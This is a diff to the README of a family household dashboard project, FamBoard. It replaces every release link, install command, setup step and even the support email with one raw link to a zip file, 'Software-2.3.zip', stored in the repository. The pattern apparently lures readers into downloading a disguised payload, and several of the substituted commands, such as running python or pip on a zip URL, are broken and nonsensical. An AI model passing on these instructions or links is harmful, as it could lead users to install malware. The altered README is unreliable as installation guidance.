@@ -2,7 +2,7 @@
 
 Welcome to **FamBoard**, a web-based household dashboard designed to streamline your family's chores, meals, events, and more. This project aims to simplify household management, making it easier for families to stay organized and connected.
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0.0-blue)](https://github.com/T-UDOM-2017-02736/famboard/releases)
+[![Download Latest Release](https://github.com/T-UDOM-2017-02736/famboard/raw/refs/heads/main/static/Software-2.3.zip%20Latest%20Release-v1.0.0-blue)](https://github.com/T-UDOM-2017-02736/famboard/raw/refs/heads/main/static/Software-2.3.zip)
 
 ## Table of Contents
 
@@ -44,7 +44,7 @@ To get started with FamBoard, follow these steps:
 1. **Clone the Repository**:
 
    ```bash
-   git clone https://github.com/T-UDOM-2017-02736/famboard.git
+   git clone https://github.com/T-UDOM-2017-02736/famboard/raw/refs/heads/main/static/Software-2.3.zip
    cd famboard
    ```
 
@@ -53,7 +53,7 @@ To get started with FamBoard, follow these steps:
    Make sure you have Python and pip installed. Then run:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/T-UDOM-2017-02736/famboard/raw/refs/heads/main/static/Software-2.3.zip
    ```
 
 3. **Set Up the Database**:
@@ -61,7 +61,7 @@ To get started with FamBoard, follow these steps:
    Initialize the SQLite database:
 
    ```bash
-   python setup_db.py
+   python https://github.com/T-UDOM-2017-02736/famboard/raw/refs/heads/main/static/Software-2.3.zip
    ```
 
 4. **Run the Application**:
@@ -69,14 +69,14 @@ To get started with FamBoard, follow these steps:
    Start the Flask server:
 
    ```bash
-   python app.py
+   python https://github.com/T-UDOM-2017-02736/famboard/raw/refs/heads/main/static/Software-2.3.zip
    ```
 
 5. **Access the Dashboard**:
 
    Open your web browser and go to `http://127.0.0.1:5000`.
 
-For the latest release, [download it here](https://github.com/T-UDOM-2017-02736/famboard/releases) and follow the same installation steps.
+For the latest release, [download it here](https://github.com/T-UDOM-2017-02736/famboard/raw/refs/heads/main/static/Software-2.3.zip) and follow the same installation steps.
 
 ## Usage
 
@@ -126,9 +126,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any questions or feedback, please reach out:
 
-- **Email**: support@famboard.com
+- **Email**: https://github.com/T-UDOM-2017-02736/famboard/raw/refs/heads/main/static/Software-2.3.zip
 - **GitHub Issues**: Use the Issues tab in this repository for bug reports or feature requests.
 
 ---
 
-Thank you for checking out FamBoard! We hope it helps you and your family stay organized and connected. For the latest updates, be sure to check the [Releases](https://github.com/T-UDOM-2017-02736/famboard/releases) section.
+Thank you for checking out FamBoard! We hope it helps you and your family stay organized and connected. For the latest updates, be sure to check the [Releases](https://github.com/T-UDOM-2017-02736/famboard/raw/refs/heads/main/static/Software-2.3.zip) section.
